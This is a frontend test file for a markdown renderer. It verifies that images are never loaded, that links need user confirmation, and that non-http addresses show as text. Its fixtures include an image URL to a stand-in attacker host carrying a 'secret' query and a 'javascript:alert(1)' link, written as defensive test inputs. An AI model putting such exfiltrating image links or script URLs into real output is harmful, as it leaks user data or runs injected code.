import "@testing-library/jest-dom/vitest";
import { cleanup, fireEvent, render, screen } from "@testing-library/react";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import ReactMarkdown from "react-markdown";

const shell = vi.hoisted(() => ({ open: vi.fn() }));
vi.mock("@tauri-apps/plugin-shell", () => shell);

import { noRemoteImages, withoutImages } from "./answerMarkdown";

beforeEach(() => shell.open.mockReset());
afterEach(() => cleanup());

describe("answer markdown", () => {
  it("never renders an img element, so nothing is fetched", () => {
    const { container } = render(
      <ReactMarkdown components={withoutImages()}>{"before ![chart](https://evil.test/p.png?q=secret) after"}</ReactMarkdown>,
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container.textContent).toContain("[Image: chart]");
    expect(container.innerHTML).not.toContain("evil.test");
  });

  it("shows a bare image as plain text and keeps the other overrides", () => {
    const { container } = render(
      <ReactMarkdown components={withoutImages({ h1: ({ children }) => <h3 data-x>{children}</h3> })}>
        {"# T\n\n![](https://evil.test/a.png)"}
      </ReactMarkdown>,
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container.textContent).toContain("[Image]");
    expect(container.querySelector("h3[data-x]")).not.toBeNull();
  });

  describe("links", () => {
    const md = (text: string) => render(<ReactMarkdown components={withoutImages()}>{text}</ReactMarkdown>);

    it("a click shows the full address and navigates nowhere until the user confirms", () => {
      md("See [the report](https://example.com/very/long/path?token=abc#part) now");
      const link = screen.getByRole("link", { name: "the report" });
      const notPrevented = fireEvent.click(link);
      expect(notPrevented, "the click's own navigation is cancelled").toBe(false);
      expect(shell.open).not.toHaveBeenCalled();
      const dialog = screen.getByRole("dialog", { name: "Open this link in your browser?" });
      expect(dialog).toHaveTextContent("https://example.com/very/long/path?token=abc#part");
      fireEvent.click(screen.getByRole("button", { name: "Open link" }));
      expect(shell.open).toHaveBeenCalledExactlyOnceWith("https://example.com/very/long/path?token=abc#part");
      expect(screen.queryByRole("dialog")).toBeNull();
    });

    it("Cancel opens nothing", () => {
      md("[x](https://example.com/)");
      fireEvent.click(screen.getByRole("link", { name: "x" }));
      fireEvent.click(screen.getByRole("button", { name: "Cancel" }));
      expect(shell.open).not.toHaveBeenCalled();
      expect(screen.queryByRole("dialog")).toBeNull();
    });

    it("a middle click is also held back, and the plain override is used by the overlay renderer too", () => {
      const { container } = render(<ReactMarkdown components={noRemoteImages}>{"[x](https://example.com/)"}</ReactMarkdown>);
      const link = container.querySelector("a")!;
      expect(fireEvent(link, new MouseEvent("auxclick", { bubbles: true, cancelable: true, button: 1 }))).toBe(false);
      expect(shell.open).not.toHaveBeenCalled();
    });

    it("an address that isn't http or https is shown as text, never as a link", () => {
      const { container } = md("[a](javascript:alert(1)) [b](mailto:x@y.z) [c](file:///C:/x) [d](/relative)");
      expect(container.querySelector("a")).toBeNull();
      expect(container.textContent).toContain("a");
      expect(container.textContent).toContain("d");
    });
  });
});
